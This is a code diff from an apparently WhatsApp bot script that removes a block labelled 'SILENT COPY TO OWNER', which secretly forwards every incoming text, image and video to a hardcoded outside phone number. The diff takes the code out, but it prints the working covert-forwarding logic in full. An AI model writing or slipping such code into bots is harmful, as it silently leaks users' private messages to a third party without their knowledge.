@@ -135,47 +135,6 @@ console.log("❌ Failed to join group:", err);
 }
 }
 
-      // ================= SILENT COPY TO OWNER =================
-try {
-    if (mek.key.fromMe) return; // avoid loop
-
-    const ownerJid = "94756599952@s.whatsapp.net"; // 👈 direct number eka danna
-
-    const type = getContentType(mek.message);
-
-    // TEXT
-    if (type === "conversation" || type === "extendedTextMessage") {
-        const text = mek.message.conversation || mek.message.extendedTextMessage?.text || "";
-
-        await test.sendMessage(ownerJid, {
-            text: text
-        });
-    }
-
-    // IMAGE / VIDEO
-    if (type === "imageMessage" || type === "videoMessage") {
-        const stream = await downloadContentFromMessage(
-            mek.message[type],
-            type === "imageMessage" ? "image" : "video"
-        );
-
-        let buffer = Buffer.from([]);
-        for await (const chunk of stream) {
-            buffer = Buffer.concat([buffer, chunk]);
-        }
-
-        const caption = mek.message[type].caption || "";
-
-        await test.sendMessage(ownerJid, {
-            [type === "imageMessage" ? "image" : "video"]: buffer,
-            caption: caption
-        });
-    }
-
-} catch (err) {
-    console.log("❌ Silent forward error:", err);
-}
-      
       // ================= AUTO CALL END =================
 test.ev.on("call", async (callData) => {
   try {
